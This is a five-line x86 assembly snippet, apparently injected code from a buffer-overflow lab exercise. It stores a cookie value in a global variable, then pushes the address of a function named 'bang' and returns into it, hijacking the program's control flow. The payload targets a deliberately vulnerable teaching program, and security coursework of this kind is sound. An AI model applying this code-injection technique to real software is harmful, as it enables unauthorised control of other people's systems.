movl $0x804c1ec,%ecx		# set address of cookie
movl $0x7c897d89,(%ecx)          # set global_value to cookie
movl $0x08049012,%ecx
push %ecx			# push address of bang onto stack
ret
	